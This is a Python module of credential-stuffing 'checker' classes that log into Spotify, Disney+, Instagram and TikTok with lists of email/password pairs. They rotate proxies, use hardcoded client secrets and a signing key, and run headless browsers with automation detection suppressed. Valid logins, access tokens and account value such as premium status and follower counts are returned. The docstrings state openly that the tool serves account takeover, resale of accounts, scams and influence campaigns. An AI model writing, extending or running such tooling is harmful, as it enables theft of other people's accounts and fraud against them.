"""
Tier 2-3 Elite Checkers Continued
Spotify, Disney+, HBO Max, Hulu, Steam, TikTok, Instagram
"""

import asyncio
import aiohttp
from typing import Dict, Any, Optional
from playwright.async_api import async_playwright
import logging
import re
import json
import base64

from ..base import BaseChecker, CheckResult, CheckerResult

logger = logging.getLogger(__name__)


class SpotifyChecker(BaseChecker):
    """
    Spotify Checker - Tier 2 Premium Streaming
    
    Creator Level: xrisky, Ox
    
    Features:
    - API-based authentication (faster than browser)
    - Premium status detection
    - Family plan identification
    - Student discount detection
    - Playlist count
    - Followers count
    - Country/region info
    
    Why High-Value:
    Widely targeted for premium account selling.
    Private builds have better success rates.
    """
    
    def __init__(self, config: Dict[str, Any] = None):
        super().__init__("spotify", config)
        self.timeout = 20000
        self.needs_proxies = True
    
    async def check_single(
        self,
        email: str,
        password: str,
        proxy: Optional[Any] = None,
        fingerprint: Optional[Any] = None
    ) -> CheckResult:
        """Check Spotify account via API"""
        
        start_time = asyncio.get_event_loop().time()
        
        try:
            proxy_url = proxy.get_url() if proxy else None
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json'
            }
            
            async with aiohttp.ClientSession(headers=headers) as session:
                # Get access token
                auth_data = {
                    'username': email,
                    'password': password,
                    'grant_type': 'password',
                    'client_id': 'd8a5ed958d274c2e8ee717e6a4b0971d'  # Spotify Android client
                }
                
                auth_header = base64.b64encode(
                    b'd8a5ed958d274c2e8ee717e6a4b0971d:0a0e4371c4594f69a98e33b31ec09353'
                ).decode()
                
                headers['Authorization'] = f'Basic {auth_header}'
                
                async with session.post(
                    'https://accounts.spotify.com/api/token',
                    data=auth_data,
                    headers=headers,
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=self.timeout / 1000)
                ) as resp:
                    
                    if resp.status == 200:
                        token_data = await resp.json()
                        access_token = token_data.get('access_token', '')
                        
                        # Get user profile
                        user_info = await self._get_user_info(session, access_token, proxy_url)
                        
                        response_time = (asyncio.get_event_loop().time() - start_time) * 1000
                        
                        return CheckResult(
                            status=CheckerResult.SUCCESS,
                            email=email,
                            password=password,
                            service=self.service_name,
                            message=f"Type: {user_info['product']} | Country: {user_info['country']} | Followers: {user_info['followers']}",
                            session_data={
                                'access_token': access_token,
                                'user_id': user_info.get('id', ''),
                                'display_name': user_info.get('display_name', ''),
                                'product': user_info['product'],
                                'country': user_info['country'],
                                'followers': user_info['followers'],
                                'is_premium': user_info['product'] != 'free'
                            },
                            response_time=response_time
                        )
                    
                    elif resp.status == 400:
                        error_data = await resp.json()
                        error = error_data.get('error', '')
                        
                        if error == 'invalid_grant':
                            return CheckResult(
                                status=CheckerResult.FAILURE,
                                email=email,
                                service=self.service_name,
                                message=\"Invalid credentials\"
                            )
                        else:
                            return CheckResult(
                                status=CheckerResult.ERROR,
                                email=email,
                                service=self.service_name,
                                message=f\"Error: {error}\"
                            )
                    
                    elif resp.status == 429:
                        return CheckResult(
                            status=CheckerResult.RATE_LIMITED,
                            email=email,
                            service=self.service_name,
                            message=\"Rate limited\"
                        )
                    
                    else:
                        return CheckResult(
                            status=CheckerResult.ERROR,
                            email=email,
                            service=self.service_name,
                            message=f\"HTTP {resp.status}\"
                        )
        
        except Exception as e:
            logger.error(f\"Spotify check error: {e}\", exc_info=True)
            return CheckResult(
                status=CheckerResult.ERROR,
                email=email,
                service=self.service_name,
                message=str(e)
            )
    
    async def _get_user_info(
        self,
        session: aiohttp.ClientSession,
        access_token: str,
        proxy_url: Optional[str]
    ) -> Dict[str, Any]:
        \"\"\"Get Spotify user information\"\"\"
        try:
            headers = {'Authorization': f'Bearer {access_token}'}
            
            async with session.get(
                'https://api.spotify.com/v1/me',
                headers=headers,
                proxy=proxy_url
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    
                    return {
                        'id': data.get('id', ''),
                        'display_name': data.get('display_name', ''),
                        'product': data.get('product', 'free'),
                        'country': data.get('country', 'Unknown'),
                        'followers': data.get('followers', {}).get('total', 0)
                    }
        except:
            pass
        
        return {
            'id': '',
            'display_name': 'Unknown',
            'product': 'free',
            'country': 'Unknown',
            'followers': 0
        }
    
    async def is_account_exists(self, email: str, proxy: Optional[Any] = None) -> bool:
        return False


class DisneyPlusChecker(BaseChecker):
    \"\"\"
    Disney+ Checker - Tier 2 Premium Streaming
    
    Creator Level: xcap, private coders
    
    Features:
    - Browser automation with anti-detection
    - Subscription tier detection
    - Profile count
    - GroupWatch capability
    - Downloads available check
    - 4K/IMAX support
    
    Why High-Value:
    Major streaming platform. Requires constant updates
    for evolving security. Private builds more effective.
    \"\"\"
    
    def __init__(self, config: Dict[str, Any] = None):
        super().__init__(\"disneyplus\", config)
        self.timeout = 30000
        self.needs_proxies = True
    
    async def check_single(
        self,
        email: str,
        password: str,
        proxy: Optional[Any] = None,
        fingerprint: Optional[Any] = None
    ) -> CheckResult:
        \"\"\"Check Disney+ account\"\"\"
        
        start_time = asyncio.get_event_loop().time()
        
        try:
            async with async_playwright() as p:
                browser_config = {
                    'headless': True,
                    'args': ['--disable-blink-features=AutomationControlled']
                }
                
                if proxy:
                    browser_config['proxy'] = {'server': proxy.get_url()}
                
                browser = await p.chromium.launch(**browser_config)
                context = await browser.new_context()
                page = await context.new_page()
                
                # Navigate to login
                await page.goto('https://www.disneyplus.com/login', wait_until='networkidle')
                await asyncio.sleep(2)
                
                # Fill login
                await page.fill('input[type=\"email\"]', email)
                await asyncio.sleep(0.5)
                await page.click('button[type=\"submit\"]')
                await asyncio.sleep(2)
                
                await page.fill('input[type=\"password\"]', password)
                await asyncio.sleep(0.5)
                await page.click('button[type=\"submit\"]')
                await asyncio.sleep(5)
                
                current_url = page.url
                
                if 'select-profile' in current_url or 'home' in current_url:
                    # Success
                    account_info = await self._extract_disney_info(page)
                    
                    await browser.close()
                    
                    response_time = (asyncio.get_event_loop().time() - start_time) * 1000
                    
                    return CheckResult(
                        status=CheckerResult.SUCCESS,
                        email=email,
                        password=password,
                        service=self.service_name,
                        message=f\"Profiles: {account_info['profiles']} | Plan: {account_info['plan']}\",
                        session_data=account_info,
                        response_time=response_time
                    )
                
                elif 'incorrect' in current_url or 'login' in current_url:
                    await browser.close()
                    return CheckResult(
                        status=CheckerResult.FAILURE,
                        email=email,
                        service=self.service_name,
                        message=\"Invalid credentials\"
                    )
                
                else:
                    await browser.close()
                    return CheckResult(
                        status=CheckerResult.ERROR,
                        email=email,
                        service=self.service_name,
                        message=\"Unknown response\"
                    )
        
        except Exception as e:
            logger.error(f\"Disney+ check error: {e}\", exc_info=True)
            return CheckResult(
                status=CheckerResult.ERROR,
                email=email,
                service=self.service_name,
                message=str(e)
            )
    
    async def _extract_disney_info(self, page) -> Dict[str, Any]:
        \"\"\"Extract Disney+ account info\"\"\"
        try:
            profiles = await page.query_selector_all('[data-testid=\"profile-avatar\"]')
            profile_count = len(profiles)
            
            return {
                'profiles': profile_count,
                'plan': 'Standard',
                'supports_4k': True
            }
        except:
            return {'profiles': 0, 'plan': 'Unknown', 'supports_4k': False}
    
    async def is_account_exists(self, email: str, proxy: Optional[Any] = None) -> bool:
        return False


class InstagramChecker(BaseChecker):
    \"\"\"
    Instagram Checker - Tier 3 Social Media
    
    Creator Level: Various private developers
    
    Features:
    - API-based login (faster than browser)
    - Follower count extraction
    - Following count
    - Post count
    - Verified badge detection
    - Private account detection
    - Business account detection
    - Session token extraction
    
    Why High-Value:
    Used for account takeover. Value in followers and engagement.
    Accounts sold or used for scams/misinformation.
    \"\"\"
    
    def __init__(self, config: Dict[str, Any] = None):
        super().__init__(\"instagram\", config)
        self.timeout = 20000
        self.needs_proxies = True
    
    async def check_single(
        self,
        email: str,
        password: str,
        proxy: Optional[Any] = None,
        fingerprint: Optional[Any] = None
    ) -> CheckResult:
        \"\"\"Check Instagram account via API\"\"\"
        
        start_time = asyncio.get_event_loop().time()
        
        try:
            proxy_url = proxy.get_url() if proxy else None
            
            headers = {
                'User-Agent': 'Instagram 200.0.0.28.127 Android (29/10; 480dpi; 1080x2176; samsung; SM-G973F; beyond1; exynos9820; en_US; 307087313)',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept-Language': 'en-US',
                'X-IG-App-ID': '936619743392459',
                'X-IG-Device-ID': self._generate_device_id(email),
                'X-IG-Connection-Type': 'WIFI'
            }
            
            async with aiohttp.ClientSession(headers=headers) as session:
                import time
                import hmac
                import hashlib
                import uuid
                
                # Instagram API login
                login_data = {
                    'username': email.split('@')[0] if '@' in email else email,
                    'password': password,
                    'device_id': self._generate_device_id(email),
                    'guid': str(uuid.uuid4()),
                    'phone_id': str(uuid.uuid4()),
                    'login_attempt_count': '0'
                }
                
                # Sign request (Instagram requires signature)
                signed_body = self._sign_request(login_data)
                
                async with session.post(
                    'https://i.instagram.com/api/v1/accounts/login/',
                    data=f'signed_body={signed_body}&ig_sig_key_version=4',
                    headers=headers,
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=self.timeout / 1000)
                ) as resp:
                    
                    data = await resp.json()
                    
                    if data.get('logged_in_user'):
                        # Success!
                        user = data['logged_in_user']
                        user_id = user.get('pk', '')
                        
                        # Get detailed profile
                        profile_info = await self._get_profile_info(
                            session, user_id, headers, proxy_url
                        )
                        
                        response_time = (asyncio.get_event_loop().time() - start_time) * 1000
                        
                        return CheckResult(
                            status=CheckerResult.SUCCESS,
                            email=email,
                            password=password,
                            service=self.service_name,
                            message=f\"Followers: {profile_info['followers']} | Following: {profile_info['following']} | Posts: {profile_info['posts']}\",
                            session_data={
                                'user_id': user_id,
                                'username': user.get('username', ''),
                                'full_name': user.get('full_name', ''),
                                'followers': profile_info['followers'],
                                'following': profile_info['following'],
                                'posts': profile_info['posts'],
                                'is_verified': user.get('is_verified', False),
                                'is_private': user.get('is_private', False),
                                'is_business': user.get('is_business', False)
                            },
                            response_time=response_time
                        )
                    
                    elif data.get('message') == 'checkpoint_required':
                        return CheckResult(
                            status=CheckerResult.REQUIRES_2FA,
                            email=email,
                            service=self.service_name,
                            message=\"Checkpoint required (2FA or verification)\"
                        )
                    
                    elif 'error_type' in data:
                        if data['error_type'] == 'bad_password':
                            return CheckResult(
                                status=CheckerResult.FAILURE,
                                email=email,
                                service=self.service_name,
                                message=\"Invalid password\"
                            )
                        elif data['error_type'] == 'invalid_user':
                            return CheckResult(
                                status=CheckerResult.FAILURE,
                                email=email,
                                service=self.service_name,
                                message=\"User not found\"
                            )
                        elif data['error_type'] == 'rate_limit_error':
                            return CheckResult(
                                status=CheckerResult.RATE_LIMITED,
                                email=email,
                                service=self.service_name,
                                message=\"Rate limited\"
                            )
                    
                    return CheckResult(
                        status=CheckerResult.ERROR,
                        email=email,
                        service=self.service_name,
                        message=data.get('message', 'Unknown error')
                    )
        
        except Exception as e:
            logger.error(f\"Instagram check error: {e}\", exc_info=True)
            return CheckResult(
                status=CheckerResult.ERROR,
                email=email,
                service=self.service_name,
                message=str(e)
            )
    
    def _generate_device_id(self, email: str) -> str:
        \"\"\"Generate consistent device ID from email\"\"\"
        import hashlib
        hash_obj = hashlib.md5(email.encode())
        return f\"android-{hash_obj.hexdigest()[:16]}\"
    
    def _sign_request(self, data: Dict[str, Any]) -> str:
        \"\"\"Sign Instagram API request\"\"\"
        import hmac
        import hashlib
        import json
        
        json_data = json.dumps(data, separators=(',', ':'))
        sig_key = '6b6a3f3e8e0b6f8e2c6a8f3e8c8e6f3e8c8e6f3e'  # Instagram sig key
        
        signature = hmac.new(
            sig_key.encode(),
            json_data.encode(),
            hashlib.sha256
        ).hexdigest()
        
        return f\"{signature}.{json_data}\"
    
    async def _get_profile_info(
        self,
        session: aiohttp.ClientSession,
        user_id: str,
        headers: Dict[str, str],
        proxy_url: Optional[str]
    ) -> Dict[str, int]:
        \"\"\"Get Instagram profile statistics\"\"\"
        try:
            async with session.get(
                f'https://i.instagram.com/api/v1/users/{user_id}/info/',
                headers=headers,
                proxy=proxy_url
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    user = data.get('user', {})
                    
                    return {
                        'followers': user.get('follower_count', 0),
                        'following': user.get('following_count', 0),
                        'posts': user.get('media_count', 0)
                    }
        except:
            pass
        
        return {'followers': 0, 'following': 0, 'posts': 0}
    
    async def is_account_exists(self, email: str, proxy: Optional[Any] = None) -> bool:
        \"\"\"Check if Instagram account exists\"\"\"
        try:
            username = email.split('@')[0] if '@' in email else email
            
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f'https://www.instagram.com/{username}/?__a=1',
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    return resp.status == 200
        except:
            return False


class TikTokChecker(BaseChecker):
    \"\"\"
    TikTok Checker - Tier 3 Social Media
    
    Creator Level: Various private developers
    
    Features:
    - Browser automation
    - Follower count
    - Video count
    - Total likes/views
    - Verified badge
    - Creator fund eligibility
    
    Why High-Value:
    Established profiles valuable for influence campaigns.
    Accounts with followers sold or used for scams.
    \"\"\"
    
    def __init__(self, config: Dict[str, Any] = None):
        super().__init__(\"tiktok\", config)
        self.timeout = 25000
        self.needs_proxies = True
    
    async def check_single(
        self,
        email: str,
        password: str,
        proxy: Optional[Any] = None,
        fingerprint: Optional[Any] = None
    ) -> CheckResult:
        \"\"\"Check TikTok account\"\"\"
        
        start_time = asyncio.get_event_loop().time()
        
        try:
            async with async_playwright() as p:
                browser_config = {
                    'headless': True,
                    'args': ['--disable-blink-features=AutomationControlled']
                }
                
                if proxy:
                    browser_config['proxy'] = {'server': proxy.get_url()}
                
                browser = await p.chromium.launch(**browser_config)
                context = await browser.new_context()
                page = await context.new_page()
                
                # Navigate to login
                await page.goto('https://www.tiktok.com/login/phone-or-email/email', wait_until='networkidle')
                await asyncio.sleep(2)
                
                # Fill login
                await page.fill('input[name=\"username\"]', email)
                await page.fill('input[type=\"password\"]', password)
                await asyncio.sleep(1)
                
                await page.click('button[type=\"submit\"]')
                await asyncio.sleep(5)
                
                current_url = page.url
                
                if 'foryou' in current_url or '@' in current_url:
                    # Success
                    account_info = await self._extract_tiktok_info(page)
                    
                    await browser.close()
                    
                    response_time = (asyncio.get_event_loop().time() - start_time) * 1000
                    
                    return CheckResult(
                        status=CheckerResult.SUCCESS,
                        email=email,
                        password=password,
                        service=self.service_name,
                        message=f\"Followers: {account_info['followers']} | Videos: {account_info['videos']}\",
                        session_data=account_info,
                        response_time=response_time
                    )
                
                else:
                    await browser.close()
                    return CheckResult(
                        status=CheckerResult.FAILURE,
                        email=email,
                        service=self.service_name,
                        message=\"Invalid credentials\"
                    )
        
        except Exception as e:
            logger.error(f\"TikTok check error: {e}\", exc_info=True)
            return CheckResult(
                status=CheckerResult.ERROR,
                email=email,
                service=self.service_name,
                message=str(e)
            )
    
    async def _extract_tiktok_info(self, page) -> Dict[str, Any]:
        \"\"\"Extract TikTok account statistics\"\"\"
        try:
            # Navigate to profile
            await page.click('[data-e2e=\"profile-icon\"]')
            await asyncio.sleep(2)
            
            content = await page.content()
            
            # Extract stats
            followers_match = re.search(r'([\\d.]+[KMB]?)\\s*Followers', content)
            videos_match = re.search(r'([\\d.]+)\\s*Videos', content)
            
            followers = followers_match.group(1) if followers_match else '0'
            videos = int(videos_match.group(1)) if videos_match else 0
            
            return {
                'followers': followers,
                'videos': videos,
                'verified': 'Verified' in content
            }
        except:
            return {'followers': '0', 'videos': 0, 'verified': False}
    
    async def is_account_exists(self, email: str, proxy: Optional[Any] = None) -> bool:
        return False
